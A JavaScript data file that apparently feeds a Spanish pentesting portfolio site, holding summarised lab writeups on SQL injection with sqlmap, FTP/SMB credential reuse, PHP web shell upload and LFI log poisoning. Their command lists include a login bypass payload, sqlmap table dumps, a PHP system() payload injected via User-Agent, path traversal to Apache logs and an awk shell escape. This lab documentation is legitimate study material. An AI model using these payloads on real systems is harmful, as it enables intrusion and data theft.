(function () {
  const base = Array.isArray(window.WRITEUPS) ? window.WRITEUPS : [];

  const difficultyMap = {
    Easy: "Fácil",
    Medium: "Media",
    Hard: "Difícil"
  };

  const categoryMap = {
    "Web Security": "Seguridad Web"
  };

  const titleMap = {
    snoopy: "Snoopy: LFI, exposición de credenciales y escalada con capabilities",
    cap: "CAP: exposición de PCAP, credenciales FTP y cap_setuid",
    "wpa2-handshake": "WPA2-PSK: captura de handshake, cracking y descifrado de tráfico"
  };

  const fallbackMap = {
    "Not documented in the available evidence.": "No documentado en la evidencia disponible.",
    "Public redacted": "Versión pública saneada"
  };

  function translate(value) {
    return fallbackMap[value] || value;
  }

  base.forEach((item) => {
    item.title = titleMap[item.id] || item.title;
    item.category = categoryMap[item.category] || item.category;
    item.difficulty = difficultyMap[item.difficulty] || item.difficulty;
    item.visibility = translate(item.visibility);
    if (item.sections) {
      Object.keys(item.sections).forEach((key) => {
        if (typeof item.sections[key] === "string") item.sections[key] = translate(item.sections[key]);
      });
    }
    if (Array.isArray(item.evidence)) {
      item.evidence.forEach((evidence) => {
        evidence.description = translate(evidence.description);
        evidence.phase = evidence.phase
          ?.replace("Reconnaissance & Enumeration", "Reconocimiento y enumeración")
          .replace("Initial Access", "Acceso inicial")
          .replace("Privilege Escalation", "Escalada de privilegios")
          .replace("Technical Evidence", "Evidencia técnica");
      });
    }
  });

  const extras = [
    {
      id: "sqlmap-sqli",
      title: "SQL Injection: bypass, sqlmap y escalada de privilegios",
      url: "writeup.html?id=sqlmap-sqli",
      category: "Seguridad Web",
      difficulty: "Media",
      readTime: "9 min",
      date: "2026",
      visibility: "Versión pública saneada",
      summary: "Caso web con bypass de autenticación, extracción controlada de datos con sqlmap, acceso SSH y escalada local.",
      tags: ["SQLi", "sqlmap", "Bypass", "SSH", "Linux", "Privilege Escalation"],
      stack: ["Nmap", "Burp Suite", "sqlmap", "Linux"],
      cover: "assets/imgs/cover-sqlmap.svg",
      icon: "🧪",
      featured: true,
      highlight: "Transformación de una inyección SQL en una ruta completa de compromiso controlado.",
      labName: "SQL Injection Lab",
      target: "Aplicación web vulnerable",
      impact: "Bypass de login, extracción de usuarios y acceso al sistema",
      killChain: ["Nmap", "Bypass de login", "Cookie de sesión", "sqlmap", "Credenciales", "Privesc"],
      sections: {
        executiveSummary: "El ejercicio A3 del ZIP muestra una cadena de ataque basada en SQL Injection: descubrimiento del servicio web, pruebas manuales de payloads de autenticación, uso de cookie de sesión para automatizar enumeración con sqlmap, extracción de tablas y validación de acceso posterior. La publicación evita mostrar usuarios, contraseñas o flags reales.",
        scopeContext: "Laboratorio controlado del módulo de seguridad en software base y aplicaciones. Se integra como writeup resumido, sin aspecto académico y sin capturas sensibles de flags.",
        reconnaissanceEnumeration: [
          "Escaneo Nmap para identificar servicios expuestos.",
          "Acceso a la página principal y revisión del formulario de autenticación.",
          "Pruebas manuales con payloads clásicos como ' OR 1=1 -- y variantes.",
          "Obtención de cookie de sesión necesaria para reproducir la explotación con sqlmap."
        ],
        attackSurfaceAnalysis: "El punto débil se concentra en una entrada de login sin parametrización adecuada. Al combinar bypass manual y sqlmap, el atacante puede pasar de validar la vulnerabilidad a enumerar bases de datos, tablas y columnas con datos sensibles.",
        initialAccess: "Tras extraer credenciales de usuarios desde la base de datos, se valida acceso remoto. En la versión pública los usuarios y contraseñas se representan como <user> y password: ********.",
        privilegeEscalation: "La práctica incluye revisión de permisos y binarios ejecutables para elevar privilegios. Las evidencias con flags se descartan o se sustituyen por marcadores saneados.",
        recommendations: [
          "Usar consultas parametrizadas y ORM correctamente configurado.",
          "Validar y normalizar entradas antes de procesarlas.",
          "Reducir mensajes de error que faciliten fingerprinting de base de datos.",
          "Aplicar MFA y evitar reutilización de credenciales entre aplicación y sistema.",
          "Monitorizar patrones anómalos de SQLi y abuso de sesiones."
        ],
        conclusion: "El caso demuestra que una SQLi en login no es solo un fallo de autenticación: puede convertirse en extracción de datos, movimiento hacia servicios remotos y escalada local si se encadenan malas prácticas."
      },
      commands: [
        "nmap -sC -sV -p- <target>",
        "' OR '1'='1' -- -",
        "sqlmap -u \"http://<target>/login\" --cookie=\"PHPSESSID=<REDACTED>\" --batch --dbs",
        "sqlmap -u \"http://<target>/login\" --cookie=\"PHPSESSID=<REDACTED>\" -D <db> --tables",
        "sqlmap -u \"http://<target>/login\" --cookie=\"PHPSESSID=<REDACTED>\" -D <db> -T users --dump",
        "ssh <user>@<target> # password: ********"
      ],
      evidence: [
        { title: "Bypass de autenticación", phase: "Explotación web", description: "Pruebas manuales de payloads SQLi sobre el formulario de login. Se excluyen capturas con datos reales.", command: "' OR '1'='1' -- -", redacted: true },
        { title: "Automatización con sqlmap", phase: "Enumeración de base de datos", description: "Uso de cookie de sesión para listar bases de datos, tablas y columnas sin publicar dumps sensibles.", command: "sqlmap -u \"http://<target>/login\" --cookie=\"PHPSESSID=<REDACTED>\" --batch --dbs", redacted: true },
        { title: "Acceso y escalada posterior", phase: "Post-explotación", description: "Validación de acceso remoto y revisión de permisos locales. Flags y credenciales eliminadas.", command: "ssh <user>@<target> # password: ********\nsudo -l\nfind / -perm -4000 -type f 2>/dev/null", redacted: true }
      ]
    },
    {
      id: "defenestration-smb-ftp",
      title: "Defenestration: FTP anónimo, SMB y abuso de credenciales",
      url: "writeup.html?id=defenestration-smb-ftp",
      category: "Redes y Servicios",
      difficulty: "Media",
      readTime: "8 min",
      date: "2026",
      visibility: "Versión pública saneada",
      summary: "Enumeración de servicios, acceso FTP anónimo, lectura de pistas operativas y autenticación SMB con credenciales reutilizadas.",
      tags: ["FTP", "SMB", "Metasploit", "Nmap", "Credential Reuse", "Windows"],
      stack: ["Nmap", "Metasploit", "FTP", "SMB"],
      cover: "assets/imgs/cover-smb-ftp.svg",
      icon: "🪟",
      featured: false,
      highlight: "Caso de exposición de servicios clásicos y malas prácticas de control de acceso.",
      labName: "Defenestration",
      target: "Host con servicios FTP/SMB/Web",
      impact: "Acceso a recursos internos y autenticación administrativa",
      killChain: ["Nmap", "Búsqueda de módulos", "FTP anónimo", "Lectura de README", "SMB", "Acceso admin"],
      sections: {
        executiveSummary: "El ejercicio A4 del ZIP se centra en servicios expuestos y credenciales débiles o reutilizadas. La cadena parte de Nmap, continúa con enumeración FTP y SMB, localiza información operativa en ficheros accesibles y termina con autenticación privilegiada en servicios internos.",
        scopeContext: "Laboratorio de explotación de servicios en red. Se publica como resumen profesional, evitando capturas decorativas, flags y posibles credenciales.",
        reconnaissanceEnumeration: ["Escaneo Nmap para detectar puertos y versiones.", "Uso de Metasploit para localizar módulos auxiliares relacionados con FTP/SMB.", "Validación de acceso FTP anónimo y revisión de ficheros expuestos.", "Enumeración SMB con credenciales descubiertas o deducidas."],
        attackSurfaceAnalysis: "La debilidad principal está en publicar información operativa en FTP y permitir acceso anónimo. Cuando ese material revela políticas, nombres de usuario o pistas de contraseña, SMB se convierte en el siguiente vector natural.",
        initialAccess: "El acceso se produce mediante servicios legítimos con permisos excesivos. En la versión pública se sustituyen usuarios, rutas sensibles y contraseñas por marcadores genéricos.",
        privilegeEscalation: "El caso termina con acceso administrativo al recurso objetivo. Las capturas con flags o contenido sensible no se integran directamente.",
        recommendations: ["Deshabilitar FTP anónimo y sustituir FTP por protocolos cifrados.", "No almacenar pistas, políticas ni credenciales en README accesibles.", "Aplicar mínimos privilegios en shares SMB.", "Auditar credenciales reutilizadas entre servicios.", "Registrar intentos de autenticación y enumeración en servicios de red."],
        conclusion: "La práctica ilustra cómo servicios aparentemente secundarios pueden filtrar el contexto necesario para comprometer recursos internos. La enumeración ordenada sigue siendo decisiva."
      },
      commands: ["nmap -sC -sV -p- <target>", "msfconsole -q", "search type:auxiliary ftp", "ftp anonymous@<target>", "smbclient -L //<target>/ -U <user>", "smbclient //<target>/<share> -U <admin>"],
      evidence: [
        { title: "Enumeración de FTP y SMB", phase: "Reconocimiento", description: "Identificación de servicios y validación de exposición inicial.", command: "nmap -sC -sV -p- <target>\nsearch type:auxiliary ftp", redacted: true },
        { title: "FTP anónimo y lectura de README", phase: "Exposición de información", description: "Revisión de ficheros accesibles que aportan pistas operativas sin publicar secretos.", command: "ftp anonymous@<target>\nls\nget README.txt", redacted: true },
        { title: "Sesión SMB autenticada", phase: "Acceso a servicio interno", description: "Autenticación sobre SMB con credenciales saneadas y acceso a recursos.", command: "smbclient -L //<target>/ -U <user>\nsmbclient //<target>/<share> -U <admin>", redacted: true }
      ]
    },
    {
      id: "webshell-upload",
      title: "Web shell upload: enumeración, subida de PHP y ejecución privilegiada",
      url: "writeup.html?id=webshell-upload",
      category: "Seguridad Web",
      difficulty: "Media",
      readTime: "10 min",
      date: "2026",
      visibility: "Versión pública saneada",
      summary: "Cadena web con Gobuster, robots.txt, panel administrativo, subida de shell PHP y ejecución con privilegios elevados.",
      tags: ["Gobuster", "robots.txt", "PHP", "Web Shell", "sudo", "Linux"],
      stack: ["Nmap", "Gobuster", "PHP", "Linux"],
      cover: "assets/imgs/cover-webshell.svg",
      icon: "🐚",
      featured: true,
      highlight: "De una ruta oculta a ejecución de comandos y control del host mediante una subida insegura.",
      labName: "Web Shell Upload Lab",
      target: "Aplicación web PHP",
      impact: "Ejecución remota de comandos y acceso root en laboratorio",
      killChain: ["Nmap", "Gobuster", "robots.txt", "Panel admin", "Subida shell.php", "sudo/root"],
      sections: {
        executiveSummary: "El ejercicio A5 del ZIP documenta un flujo muy representativo de pentesting web: descubrimiento de rutas con Gobuster, lectura de robots.txt, acceso a área administrativa, identificación de una funcionalidad de subida y carga de una shell PHP para ejecutar comandos. El contenido se sanea para no publicar flags ni payloads reutilizables peligrosos sin contexto.",
        scopeContext: "Entorno de laboratorio autorizado. Se conserva la lógica técnica y se eliminan flags, resultados sensibles y cualquier credencial mostrada en capturas.",
        reconnaissanceEnumeration: ["Escaneo inicial con Nmap.", "Enumeración de directorios con Gobuster.", "Revisión de robots.txt y rutas administrativas.", "Inspección de código fuente y funcionalidades expuestas."],
        attackSurfaceAnalysis: "El riesgo aparece por una funcionalidad de subida mal restringida. Si el servidor permite cargar y ejecutar PHP en un directorio accesible, la aplicación pasa de exposición web a ejecución remota de comandos.",
        initialAccess: "La shell subida permite ejecutar comandos como el usuario del servicio web. La publicación muestra comandos genéricos y elimina salidas con información sensible.",
        privilegeEscalation: "La práctica incluye revisión de entorno, permisos y ejecución mediante sudo o scripts asociados para obtener salida privilegiada. Las flags se sustituyen por marcadores saneados.",
        recommendations: ["Validar extensión, MIME real y contenido de archivos subidos.", "Guardar uploads fuera del webroot o servirlos sin permisos de ejecución.", "Aplicar listas blancas estrictas y renombrado seguro de ficheros.", "Ejecutar el servidor web con permisos mínimos.", "Auditar reglas sudo y scripts invocados por la aplicación."],
        conclusion: "El caso resume por qué las subidas de ficheros son críticas: si no se aíslan correctamente, una función aparentemente normal puede convertirse en RCE y escalada posterior."
      },
      commands: ["nmap -sC -sV -p- <target>", "gobuster dir -u http://<target>/ -w <wordlist>", "curl http://<target>/robots.txt", "# upload shell.php through authorized lab form", "curl \"http://<target>/uploads/shell.php?cmd=whoami\"", "sudo -l"],
      evidence: [
        { title: "Descubrimiento de rutas", phase: "Reconocimiento", description: "Gobuster y robots.txt permiten localizar rutas relevantes para la explotación.", command: "gobuster dir -u http://<target>/ -w <wordlist>\ncurl http://<target>/robots.txt", redacted: true },
        { title: "Subida de shell PHP", phase: "Explotación web", description: "Carga controlada de un fichero PHP en laboratorio. Se evita publicar el payload completo.", command: "# upload shell.php\ncurl \"http://<target>/uploads/shell.php?cmd=whoami\"", redacted: true },
        { title: "Ejecución privilegiada", phase: "Escalada de privilegios", description: "Revisión de entorno y permisos hasta ejecutar acciones privilegiadas. Salidas sensibles eliminadas.", command: "whoami\nenv\nsudo -l", redacted: true }
      ]
    },
    {
      id: "lfi-log-poisoning",
      title: "LFI + Log Poisoning: ejecución remota y escalada con awk",
      url: "writeup.html?id=lfi-log-poisoning",
      category: "Seguridad Web",
      difficulty: "Media",
      readTime: "9 min",
      date: "2026",
      visibility: "Versión pública saneada",
      summary: "Explotación de LFI mediante envenenamiento de logs de Apache para conseguir ejecución y escalar privilegios con un binario permitido.",
      tags: ["LFI", "Log Poisoning", "Apache", "RCE", "awk", "Linux"],
      stack: ["Nmap", "Apache", "PHP", "awk"],
      cover: "assets/imgs/cover-log-poisoning.svg",
      icon: "🧾",
      featured: false,
      highlight: "De lectura local a ejecución de comandos a través de logs contaminados.",
      labName: "Titanic LFI Log Poisoning",
      target: "Servidor web Apache",
      impact: "RCE y escalada local a root en laboratorio",
      killChain: ["Nmap", "LFI", "Apache logs", "Log poisoning", "RCE", "awk privesc"],
      sections: {
        executiveSummary: "El ejercicio A7 del ZIP documenta una explotación de Local File Inclusion que evoluciona a Remote Code Execution mediante log poisoning. Tras acceder a logs de Apache, se inyecta una carga controlada en el User-Agent y se incluye el log contaminado para ejecutar comandos. La fase final muestra escalada con awk en un entorno de laboratorio.",
        scopeContext: "Práctica grupal controlada. Se integran los pasos técnicos en formato de portfolio, eliminando flags y cualquier valor reutilizable sensible.",
        reconnaissanceEnumeration: ["Escaneo Nmap para identificar el servicio web.", "Acceso a la página vulnerable y pruebas de inclusión de ficheros.", "Localización de logs de Apache como objetivo de inclusión.", "Validación de ejecución tras contaminar el log."],
        attackSurfaceAnalysis: "La LFI permite leer ficheros locales, pero el impacto sube cuando el atacante consigue controlar un fichero incluido por la aplicación. Los logs de Apache son un objetivo clásico porque almacenan cabeceras HTTP controlables.",
        initialAccess: "El acceso se obtiene convirtiendo la lectura local en ejecución de comandos a través de log poisoning. La shell y las salidas se documentan de forma saneada.",
        privilegeEscalation: "La práctica identifica una vía de escalada con awk. El detalle se conserva a nivel metodológico y se eliminan flags o datos internos.",
        recommendations: ["Bloquear includes dinámicos de rutas controladas por usuario.", "Aplicar whitelists de recursos permitidos.", "Evitar que la aplicación pueda leer logs u otros ficheros operativos.", "Sanear logs y monitorizar payloads en cabeceras HTTP.", "Revisar permisos sudo y binarios permitidos con GTFOBins."],
        conclusion: "El caso muestra cómo una LFI puede escalar de lectura a ejecución cuando se combina con ficheros parcialmente controlados por el atacante. La separación de privilegios y el control de rutas son esenciales."
      },
      commands: ["nmap -sC -sV -p- <target>", "curl \"http://<target>/index.php?page=../../../../var/log/apache2/access.log\"", "curl -A \"<?php system($_GET['cmd']); ?>\" http://<target>/", "curl \"http://<target>/index.php?page=../../../../var/log/apache2/access.log&cmd=id\"", "sudo -l", "awk 'BEGIN { system(\"/bin/sh\") }'"],
      evidence: [
        { title: "Validación de LFI", phase: "Reconocimiento y explotación", description: "Confirmación de lectura de ficheros locales y acceso a logs de Apache.", command: "curl \"http://<target>/index.php?page=../../../../var/log/apache2/access.log\"", redacted: true },
        { title: "Log poisoning", phase: "RCE", description: "Inyección controlada en cabeceras HTTP y posterior inclusión del log contaminado.", command: "curl -A \"<?php system($_GET['cmd']); ?>\" http://<target>/\ncurl \"http://<target>/index.php?page=../../../../var/log/apache2/access.log&cmd=id\"", redacted: true },
        { title: "Escalada con awk", phase: "Escalada de privilegios", description: "Uso de un binario permitido para obtener shell privilegiada en laboratorio.", command: "sudo -l\nawk 'BEGIN { system(\"/bin/sh\") }'", redacted: true }
      ]
    }
  ];

  extras.forEach((item) => {
    if (!base.some((existing) => existing.id === item.id)) base.push(item);
  });

  window.WRITEUPS = base;
})();
